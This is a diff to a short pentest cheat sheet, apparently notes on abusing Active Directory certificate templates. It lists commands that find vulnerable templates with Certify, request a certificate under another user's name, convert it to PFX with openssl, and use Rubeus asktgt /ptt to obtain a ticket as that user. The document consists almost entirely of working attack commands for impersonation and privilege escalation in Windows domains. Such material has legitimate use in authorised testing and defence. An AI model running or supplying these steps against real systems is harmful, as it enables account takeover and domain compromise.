@@ -9,7 +9,8 @@ Certify.exe find /vulnerable
 Certify.exe request /ca:"<fqdnCertificateServer>" /template:"<templateName>" /altname:"<altUser>"
 
 # convert pem file to pfx file using linux
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <file>.pfx
 
 # impersonate user
-Rubeus.exe asktgt /user:<altUser> /certificate:<certificateFile>.pfx /ptt
+Rubeus.exe asktgt /user:<altUser> /certificate:<file>.pfx /ptt
 
